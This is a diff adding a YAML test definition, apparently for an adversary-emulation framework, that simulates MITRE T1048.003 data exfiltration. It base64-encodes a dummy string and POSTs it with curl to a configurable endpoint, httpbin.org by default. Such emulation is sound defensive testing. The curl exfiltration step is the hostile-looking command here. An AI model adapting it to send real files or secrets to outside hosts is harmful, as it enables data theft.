@@ -1,0 +1,28 @@
+---
+name: exfiltrate-data
+description: Exfiltrate data via a specified endpoint.
+requirements:
+  platforms:
+    - os: linux
+args:
+  - name: exfil_endpoint
+    default: "https://httpbin.org/post"
+mitre:
+  tactics:
+    - TA0010 Exfiltration
+  techniques:
+    - T1048 Exfiltration Over Alternative Protocol
+  subtechniques:
+    - T1048.003 Exfiltration Over Alternative Protocol Exfiltration Over Unencrypted Non-C2 Protocol
+steps:
+  - name: setup
+    inline: |
+        if ! command -v curl &> /dev/null; then
+            echo "Error: curl is not installed on the current system, cannot post to exfiltration endpoint"
+            exit 1
+        fi
+  - name: exfiltrate-data
+    inline: |
+      echo "I am data - why am I going where I am going?!" \
+          | base64 -w 0 \
+          | curl -X POST {{ .Args.exfil_endpoint }} -d @-
